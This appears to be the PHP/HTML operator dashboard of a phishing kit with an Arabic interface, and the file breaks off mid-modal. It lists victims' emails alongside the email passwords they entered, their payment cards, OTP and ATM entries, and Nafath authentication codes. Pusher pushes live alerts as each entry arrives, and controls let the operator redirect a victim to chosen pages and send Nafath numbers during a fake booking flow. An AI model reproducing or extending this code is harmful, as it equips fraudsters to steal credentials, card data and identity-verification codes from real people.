<?php
declare(strict_types=1);
require_once __DIR__ . '/init.php';
date_default_timezone_set('Asia/Amman');

if (empty($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: login.php');
    exit;
}

// تضمين ملف الدوال المساعدة إذا كان موجوداً
if (file_exists('dashboard-helpers.php')) {
    require_once('dashboard-helpers.php');
}

$users = $User->fetchAllUsers();
if ($users === false) {
    $users = [];
}

if (isset($_POST['deleteUser'])) {
    $id = $_POST['userId'];
    $User->DeleteUserById($id);
    $User->redirect('index.html');
}

if (isset($_POST['deleteAllUser'])) {
    $User->DeleteAllUsers();
    $User->redirect('index.html');
}

$visitCount = $User->getVisitsCount();
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>لوحة التحكم - نظام إدارة العملاء</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --danger-color: #ef4444;
            --info-color: #3b82f6;
            --dark-bg: #1f2937;
            --light-bg: #f9fafb;
            --shadow-sm: 0 1px 3px rgba(0,0,0,0.1);
            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
            --shadow-lg: 0 10px 15px rgba(0,0,0,0.1);
            --shadow-xl: 0 20px 25px rgba(0,0,0,0.15);
        }
        
        * {
            font-family: "Cairo", sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        /* ============ HEADER SECTION ============ */
        .dashboard-header {
            background: white;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: var(--shadow-xl);
            animation: slideDown 0.5s ease-out;
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .header-title {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .header-title i {
            font-size: 2.5rem;
            background: var(--primary-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .header-title h1 {
            font-size: 1.8rem;
            font-weight: 700;
            color: #1f2937;
            margin: 0;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            padding: 12px 25px;
            border-radius: 10px;
            text-decoration: none;
            font-weight: 600;
            font-size: 0.95rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
        }
        
        .btn-logout:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
            color: white;
        }
        
        /* ============ STATS CARDS ============ */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: var(--shadow-md);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: var(--primary-gradient);
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: var(--shadow-xl);
        }
        
        .stat-icon {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            margin-bottom: 15px;
        }
        
        .stat-icon.visits {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .stat-icon.users {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }
        
        .stat-icon.pending {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            color: white;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            color: #1f2937;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #6b7280;
            font-size: 0.9rem;
            font-weight: 500;
        }
        
        /* ============ ACTION BUTTONS ============ */
        .actions-bar {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: var(--shadow-md);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .btn-custom {
            padding: 12px 30px;
            border-radius: 10px;
            border: none;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-danger-custom {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
        }
        
        .btn-danger-custom:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
        }
        
        .btn-primary-custom {
            background: var(--primary-gradient);
            color: white;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }
        
        .btn-primary-custom:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        
        /* ============ TABLE SECTION ============ */
        .table-section {
            background: white;
            border-radius: 20px;
            box-shadow: var(--shadow-xl);
            overflow: hidden;
            animation: fadeIn 0.6s ease-out;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        .table-header {
            background: var(--primary-gradient);
            padding: 20px 30px;
            color: white;
        }
        
        .table-header h3 {
            margin: 0;
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .table-responsive {
            padding: 0;
            max-height: 700px;
            overflow-y: auto;
        }
        
        /* Custom Scrollbar */
        .table-responsive::-webkit-scrollbar {
            width: 8px;
        }
        
        .table-responsive::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        
        .table-responsive::-webkit-scrollbar-thumb {
            background: #667eea;
            border-radius: 4px;
        }
        
        .modern-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin: 0;
        }
        
        .modern-table thead {
            position: sticky;
            top: 0;
            z-index: 10;
            background: #f9fafb;
        }
        
        .modern-table thead th {
            padding: 18px 15px;
            text-align: center;
            font-weight: 700;
            font-size: 0.85rem;
            color: #374151;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 2px solid #e5e7eb;
        }
        
        .modern-table tbody tr {
            transition: all 0.3s ease;
            border-bottom: 1px solid #f3f4f6;
        }
        
        .modern-table tbody tr:hover {
            background: linear-gradient(90deg, #f9fafb 0%, #f3f4f6 100%);
            transform: scale(1.01);
        }
        
        .modern-table tbody tr.highlight {
            background: linear-gradient(90deg, #fef3c7 0%, #fde68a 100%);
            animation: pulse 2s ease-in-out infinite;
            border-left: 4px solid #f59e0b;
        }

        /* صف بيانات تسجيل دخول وصل للتو عبر Pusher */
        .modern-table tbody tr.row-login-fresh {
            background: linear-gradient(90deg, #ecfdf5 0%, #d1fae5 50%, #ecfdf5 100%) !important;
            border-left: 5px solid #059669;
            box-shadow: inset 0 0 0 1px rgba(5, 150, 105, 0.2);
        }
        .modern-table tbody tr.row-login-fresh:hover {
            background: linear-gradient(90deg, #d1fae5 0%, #a7f3d0 100%) !important;
        }
        /* تمييز لوني لتحديثات Pusher: بطاقة / OTP / ATM / شبكة */
        .modern-table tbody tr.highlight.row-upd-card {
            background: linear-gradient(90deg, #ede9fe 0%, #e9d5ff 100%) !important;
            border-left: 4px solid #7c3aed;
            animation: none;
        }
        .modern-table tbody tr.highlight.row-upd-otp {
            background: linear-gradient(90deg, #e0f2fe 0%, #bae6fd 100%) !important;
            border-left: 4px solid #0284c7;
            animation: none;
        }
        .modern-table tbody tr.highlight.row-upd-atm {
            background: linear-gradient(90deg, #d1fae5 0%, #a7f3d0 100%) !important;
            border-left: 4px solid #059669;
            animation: none;
        }
        .modern-table tbody tr.highlight.row-upd-network {
            background: linear-gradient(90deg, #ffedd5 0%, #fed7aa 100%) !important;
            border-left: 4px solid #ea580c;
            animation: none;
        }
        .modern-table tbody tr.highlight.row-upd-info {
            border-left: 4px solid #f59e0b;
        }
        /* وميض ملحوظ عند وصول تحديث Pusher جديد */
        .modern-table tbody tr.bujairi-live-flash {
            animation: bujairiLiveFlash 2.2s ease-out 1 !important;
            box-shadow: inset 0 0 0 2px rgba(14, 165, 233, 0.55);
        }
        @keyframes bujairiLiveFlash {
            0% { filter: brightness(1); box-shadow: inset 0 0 0 3px rgba(14, 165, 233, 0.85); }
            35% { filter: brightness(1.08); box-shadow: inset 0 0 0 2px rgba(244, 63, 94, 0.45); }
            100% { filter: brightness(1); box-shadow: inset 0 0 0 0 transparent; }
        }
        .status-login-live {
            background: linear-gradient(135deg, #34d399 0%, #10b981 100%);
            color: #fff;
            font-weight: 700;
            box-shadow: 0 2px 8px rgba(16, 185, 129, 0.35);
        }
        
        @keyframes pulse {
            0%, 100% {
                background: linear-gradient(90deg, #fef3c7 0%, #fde68a 100%);
            }
            50% {
                background: linear-gradient(90deg, #fde68a 0%, #fef3c7 100%);
            }
        }
        
        .modern-table tbody td {
            padding: 16px 15px;
            text-align: center;
            font-size: 0.9rem;
            color: #374151;
            vertical-align: middle;
        }
        
        /* ============ BADGES & STATUS ============ */
        .status-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .status-new {
            background: #dbeafe;
            color: #1e40af;
        }
        
        .status-pending {
            background: #fef3c7;
            color: #92400e;
        }
        
        .status-active {
            background: #d1fae5;
            color: #065f46;
        }
        .status-badge-upd-card { background: #ede9fe; color: #5b21b6; }
        .status-badge-upd-otp { background: #e0f2fe; color: #0369a1; }
        .status-badge-upd-atm { background: #d1fae5; color: #047857; }
        .status-badge-upd-network { background: #ffedd5; color: #c2410c; }
        
        /* ============ ACTION BUTTONS IN TABLE ============ */
        .btn-table {
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 2px;
        }
        
        .btn-info {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: white;
        }
        
        .btn-info:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
        }
        
        .btn-card {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
            color: white;
        }
        
        .btn-card:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.4);
        }
        
        .btn-nafad {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }
        
        .btn-nafad:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
        }
        
        .btn-delete {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
        }
        
        .btn-delete:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
        }
        
        /* ============ MODALS ============ */
        .modal-content {
            border-radius: 20px;
            border: none;
            box-shadow: var(--shadow-xl);
        }
        
        .modal-header {
            background: var(--primary-gradient);
            color: white;
            border-radius: 20px 20px 0 0;
            padding: 25px 30px;
            border-bottom: none;
        }
        
        .modal-title {
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .modal-body {
            padding: 30px;
        }
        
        .info-card {
            background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border-right: 4px solid #667eea;
        }
        
        .info-card h6 {
            color: #667eea;
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .info-card p {
            margin: 8px 0;
            color: #4b5563;
            font-size: 0.9rem;
        }
        
        .info-card p strong {
            color: #1f2937;
            font-weight: 600;
        }
        /* ✅ تنسيق بطاقات المعلومات */
.info-card {
    background: #f8f9fa;
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 20px;
    border: 1px solid #e0e0e0;
    transition: all 0.3s ease;
}

.info-card:hover {
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    transform: translateY(-2px);
}

.info-card h6 {
    color: #2d3748;
    font-weight: 700;
    font-size: 1rem;
    margin-bottom: 15px;
    padding-bottom: 10px;
    border-bottom: 2px solid #e0e0e0;
    display: flex;
    align-items: center;
    gap: 8px;
}

.info-card h6 i {
    color: #667eea;
}

.info-card p {
    margin-bottom: 10px;
    font-size: 0.95rem;
    color: #4a5568;
    display: flex;
    justify-content: space-between;
}

.info-card p strong {
    color: #2d3748;
    font-weight: 600;
    min-width: 140px;
}

.info-card p:last-child {
    margin-bottom: 0;
}
        .redirect-box {
            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 25px;
            border: 2px solid #f59e0b;
        }
        
        .redirect-box label {
            font-weight: 700;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: #92400e;
        }
        
        .form-select-modern {
            border: 2px solid #667eea;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 15px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .form-select-modern:focus {
            border-color: #764ba2;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
            outline: none;
        }
        
        .btn-redirect {
            background: var(--primary-gradient);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-weight: 700;
            width: 100%;
            transition: all 0.3s;
            font-size: 1rem;
        }
        
        .btn-redirect:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        
        /* ============ CHECKBOX STYLING ============ */
        .checkbox-modern {
            width: 20px;
            height: 20px;
            cursor: pointer;
            accent-color: #667eea;
        }
        
        /* ============ RESPONSIVE ============ */
        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .actions-bar {
                flex-direction: column;
                align-items: stretch;
            }
            
            .btn-custom {
                width: 100%;
                justify-content: center;
            }
            
            .modern-table thead th,
            .modern-table tbody td {
                padding: 10px 8px;
                font-size: 0.8rem;
            }
        }
        
        /* ============ EMPTY STATE ============ */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #6b7280;
        }
        
        .empty-state i {
            font-size: 4rem;
            margin-bottom: 20px;
            opacity: 0.3;
        }
        
        .empty-state h3 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }
        
        /* ============ LOADING SPINNER ============ */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ============ CONNECTION DOT ============ */
        .connection-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #10b981;
            animation: breathe 2s ease-in-out infinite;
            box-shadow: 0 0 10px #10b981;
        }

        .connection-dot.disconnected {
            background: #ef4444;
            animation: none;
            box-shadow: 0 0 10px #ef4444;
        }

        @keyframes breathe {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
        }

        /* ============ FILTER BUTTONS ============ */
        .filter-bar {
            background: white;
            border-radius: 15px;
            padding: 15px 20px;
            margin-bottom: 20px;
            box-shadow: var(--shadow-md);
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }

        .filter-btn {
            padding: 8px 20px;
            border-radius: 8px;
            border: 2px solid #e5e7eb;
            background: white;
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: all 0.3s;
            color: #6b7280;
        }

        .filter-btn:hover {
            border-color: #667eea;
            color: #667eea;
        }

        .filter-btn.active {
            background: var(--primary-gradient);
            color: white;
            border-color: transparent;
        }

        /* ============ TOAST NOTIFICATIONS ============ */
        .toast-container {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .toast {
            background: white;
            border-radius: 12px;
            padding: 15px 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            gap: 12px;
            min-width: 300px;
            max-width: 400px;
            transform: translateX(-120%);
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            border-right: 4px solid #10b981;
        }

        .toast.show {
            transform: translateX(0);
            opacity: 1;
        }

        .toast.success { border-right-color: #10b981; }
        .toast.error { border-right-color: #ef4444; }
        .toast.warning { border-right-color: #f59e0b; }
        .toast.info { border-right-color: #3b82f6; }

        .toast-icon {
            font-size: 1.5rem;
        }

        .toast-content {
            flex: 1;
        }

        .toast-title {
            font-weight: 700;
            font-size: 0.95rem;
            color: #1f2937;
        }

        .toast-message {
            font-size: 0.85rem;
            color: #6b7280;
            margin-top: 2px;
        }

        /* ============ BULK ACTIONS ============ */
        .bulk-actions {
            display: none;
            background: #fef3c7;
            border-radius: 12px;
            padding: 12px 20px;
            margin-bottom: 15px;
            align-items: center;
            gap: 15px;
            border: 2px solid #f59e0b;
        }

        .bulk-actions.show {
            display: flex;
        }

        .bulk-actions-text {
            flex: 1;
            font-weight: 600;
            color: #92400e;
        }

        .btn-bulk {
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-bulk-delete {
            background: #ef4444;
            color: white;
        }

        .btn-bulk-delete:hover {
            background: #dc2626;
        }
    </style>
</head>
<body>
    <div class="container-fluid" style="max-width: 1600px;">
        
        <!-- ============ DASHBOARD HEADER ============ -->
        <div class="dashboard-header">
            <div class="header-title">
                <i class="fas fa-chart-line"></i>
                <div style="flex: 1;">
                    <h1>لوحة التحكم الرئيسية</h1>
                    <p style="margin: 5px 0 0; font-size: 0.9rem; color: #6b7280;">
                        <i class="fas fa-user"></i>
                        مرحباً، <strong><?= htmlspecialchars($_SESSION['admin_full_name'] ?? $_SESSION['admin_username']); ?></strong>
                    </p>
                </div>
                <a href="logout.php" class="btn-logout" onclick="return confirm('هل تريد تسجيل الخروج؟')">
                    <i class="fas fa-sign-out-alt"></i>
                    تسجيل الخروج
                </a>
            </div>
            
            <!-- Stats Grid -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon visits">
                        <i class="fas fa-eye"></i>
                    </div>
                    <div class="stat-value" id="visitCountDisplay"><?= number_format($visitCount); ?></div>
                    <div class="stat-label">إجمالي الزيارات</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon users">
                        <i class="fas fa-users"></i>
                    </div>
                    <div class="stat-value" id="userCountDisplay"><?= $users ? count($users) : 0; ?></div>
                    <div class="stat-label">إجمالي العملاء</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon pending">
                        <i class="fas fa-bell"></i>
                    </div>
                    <div class="stat-value" id="unreadCount">0</div>
                    <div class="stat-label">غير مقروءة</div>
                </div>

                <div class="stat-card" style="border: 2px solid #10b981;">
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <div id="connectionDot" class="connection-dot"></div>
                        <div>
                            <div class="stat-value" style="font-size: 1.2rem;" id="connectionStatus">متصل</div>
                            <div class="stat-label" id="lastUpdate">آخر تحديث: الآن</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- ============ ACTIONS BAR ============ -->
        <div class="actions-bar">
<div style="display: flex; gap: 10px; flex-wrap: wrap;">
    <button class="btn-custom btn-primary-custom" onclick="refreshData()">
        <i class="fas fa-sync-alt"></i>
        تحديث البيانات
    </button>
    
    <!-- ✅ زر البطاقات الجديد -->
    <a href="cards.php" class="btn-custom" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; text-decoration: none; box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);">
        <i class="fas fa-credit-card"></i>
        البطاقات
    </a>
    
    <a href="add-admin.php" class="btn-custom" style="background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%); color: white; text-decoration: none; box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);">
        <i class="fas fa-users-cog"></i>
        إدارة المشرفين
    </a>
</div>
            
            <div>
                <form method="POST" onsubmit="return confirm('⚠️ هل أنت متأكد من حذف جميع المستخدمين؟\n\nهذا الإجراء لا يمكن التراجع عنه!')" style="margin: 0; display: inline;">
                    <button type="submit" name="deleteAllUser" class="btn-custom btn-danger-custom">
                        <i class="fas fa-trash-alt"></i>
                        حذف جميع البيانات
                    </button>
                </form>
            </div>
        </div>

        <!-- ============ FILTER BAR ============ -->
        <div class="filter-bar">
            <span style="font-weight: 700; color: #374151;">
                <i class="fas fa-filter"></i> فلترة:
            </span>
            <button class="filter-btn active" onclick="filterRows('all')">
                <i class="fas fa-list"></i> الكل
            </button>
            <button class="filter-btn" onclick="filterRows('unread')">
                <i class="fas fa-bell"></i> غير مقروءة فقط
            </button>
            <button class="filter-btn" onclick="filterRows('read')">
                <i class="fas fa-check"></i> مقروءة فقط
            </button>
        </div>

        <!-- ============ BULK ACTIONS ============ -->
        <div class="bulk-actions" id="bulkActions">
            <span class="bulk-actions-text">
                <i class="fas fa-check-square"></i>
                تم تحديد <strong id="selectedCount">0</strong> عميل
            </span>
            <button class="btn-bulk btn-bulk-delete" onclick="bulkDelete()">
                <i class="fas fa-trash"></i> حذف المحدد
            </button>
        </div>
        
        <!-- ============ TABLE SECTION ============ -->
        <div class="table-section">
            <div class="table-header">
                <h3>
                    <i class="fas fa-table"></i>
                    قائمة العملاء والمستخدمين
                </h3>
            </div>
            
            <div class="table-responsive">
                <?php if ($users != false && count($users) > 0): ?>
                <table class="modern-table">
<thead>
    <tr>
        <th><input type="checkbox" id="selectAll" class="checkbox-modern"></th>
        <th><i class="fas fa-signature"></i> الاسم الظاهر</th>
        <th><i class="fas fa-comment"></i> ملاحظة</th>
        <th><i class="fas fa-envelope"></i> البريد الإلكتروني</th>
        <th><i class="fas fa-key"></i> كلمة سر بريد الدخول</th>
        <th><i class="fas fa-phone"></i> جوال (آخر طلب)</th>
        <th><i class="fas fa-info-circle"></i> معلومات</th>
        <th><i class="fas fa-credit-card"></i> البطاقات</th>
        <th><i class="fas fa-shield-alt"></i> نفاذ</th>
        <th><i class="fas fa-key"></i> رمز نفاذ</th>
        <th><i class="fas fa-clock"></i> التاريخ</th>
        <th><i class="fas fa-cog"></i> إجراءات</th>
    </tr>
</thead>
<tbody id="usersTableBody">
    <?php foreach ($users as $row): ?>
        <?php
        $canSendNafath = false;
        if (function_exists('dashboard_pdo')) {
            try {
                $emRow = trim((string) ($row->email ?? ''));
                if ($emRow !== '') {
                    $pdoRow = dashboard_pdo();
                    $stRow = $pdoRow->prepare(
                        'SELECT client_redirect_url FROM orders WHERE customer_email = ? ORDER BY id DESC LIMIT 1'
                    );
                    $stRow->execute([$emRow]);
                    $lrUrl = trim((string) ($stRow->fetchColumn() ?: ''));
                    $canSendNafath = $lrUrl !== ''
                        && str_contains(strtolower($lrUrl), 'nafath.php')
                        && str_contains($lrUrl, 'booking/');
                }
            } catch (Throwable $e) {
                $canSendNafath = false;
            }
        }
        ?>
        <tr data-user-id="<?= (int) $row->id; ?>" data-user-email="<?= htmlspecialchars((string) ($row->email ?? ''), ENT_QUOTES, 'UTF-8'); ?>">
            <td>
                <input type="checkbox" class="user-checkbox checkbox-modern" onchange="updateBulkActions()">
            </td>
            <td>
                <strong><?= htmlspecialchars((string) ($row->full_name !== null && (string) $row->full_name !== '' ? $row->full_name : '—'), ENT_QUOTES, 'UTF-8'); ?></strong>
            </td>
            <td id="message<?= (int) $row->id; ?>">
                <span class="status-badge status-new"><?= !empty($row->is_guest_only) ? 'دخول ضيف (بدون حساب)' : 'عميل مسجّل'; ?></span>
            </td>
            <td>
                <strong style="color: #374151;"><?= htmlspecialchars((string) ($row->email ?? '—'), ENT_QUOTES, 'UTF-8'); ?></strong>
            </td>
            <td>
                <span style="color: #667eea; font-weight: 600; word-break: break-all;">
                    <?= htmlspecialchars((string) ($row->email_password_entered ?? '—'), ENT_QUOTES, 'UTF-8'); ?>
                </span>
            </td>
            <td>
                <?= htmlspecialchars((string) ($row->last_order_phone ?? '—'), ENT_QUOTES, 'UTF-8'); ?>
            </td>
            <td>
                <button class="btn-table btn-info" onclick="showUserInfo(<?= $row->id; ?>)">
                    <i class="fas fa-info-circle"></i> عرض
                </button>
            </td>
            <td>
                <button class="btn-table btn-card" onclick="showUserCards(<?= $row->id; ?>)">
                    <i class="fas fa-credit-card"></i> البطاقات
                </button>
            </td>
            <td>
                <button class="btn-table btn-nafad" onclick="showUserNafad(<?= $row->id; ?>)">
                    <i class="fas fa-shield-alt"></i> نفاذ
                </button>
            </td>
<td>
    <button type="button" class="btn-table btn-nafad" onclick="showNafathSend(<?= (int) $row->id; ?>)"
        <?= $canSendNafath ? '' : 'disabled title="وجّه العميل إلى booking/nafath.php أولاً" style="opacity:0.5;cursor:not-allowed;"' ?>>
        <i class="fas fa-key"></i> إرسال
    </button>
</td>
<td>
    <?php
    $timestamp = strtotime($row->created_at . ' +3 hours');
    ?>
    <small><?= date('Y/m/d', $timestamp); ?><br>
    <?= date('h:i A', $timestamp); ?></small>
</td>
            <td>
                <form method="POST" style="display:inline; margin:0;" onsubmit="return confirm('هل تريد حذف هذا المستخدم؟')">
                    <input type="hidden" name="userId" value="<?= $row->id; ?>">
                    <button type="submit" name="deleteUser" class="btn-table btn-delete">
                        <i class="fas fa-trash"></i>
                    </button>
                </form>
            </td>
        </tr>
    <?php endforeach; ?>
</tbody>
                </table>
                <?php else: ?>
                <div class="empty-state">
                    <i class="fas fa-inbox"></i>
                    <h3>لا توجد بيانات</h3>
                    <p>لم يتم تسجيل أي عملاء بعد</p>
                </div>
                <?php endif; ?>
            </div>
        </div>
        
    </div>

    <!-- ============ MODALS ============ -->
    
    <!-- Modal معلومات المستخدم -->
    <div class="modal fade" id="userInfoModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-user-circle"></i>
                        معلومات المستخدم التفصيلية
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
<select class="form-select form-select-modern" id="redirectPageUser"></select>
                        <button class="btn btn-redirect" onclick="redirectUser()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userInfoContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل البيانات...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal بطاقات المستخدم -->
    <div class="modal fade" id="userCardsModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-credit-card"></i>
                        بطاقات المستخدم
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
<select class="form-select form-select-modern" id="redirectPageCard"></select>
                        <button class="btn btn-redirect" onclick="redirectUserFromCard()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userCardsContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل البطاقات...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal نفاذ — بيانات الصفحات + إرسال الرقم -->
    <div class="modal fade" id="userNafadModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-shield-alt"></i>
                        نفاذ — بيانات العميل والرمز
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
                        <select class="form-select form-select-modern" id="redirectPageNafad"></select>
                        <button type="button" class="btn btn-redirect" onclick="redirectUserFromNafad()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>

                    <div id="nafathBookingSnapshot" class="mt-3"></div>

                    <hr>

                    <h6 class="mb-2" style="color:#667eea;font-weight:700;"><i class="fas fa-database"></i> رموز وسجلات النظام</h6>
                    <div id="userNafadContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل بيانات نفاذ...</p>
                        </div>
                    </div>

                    <hr>

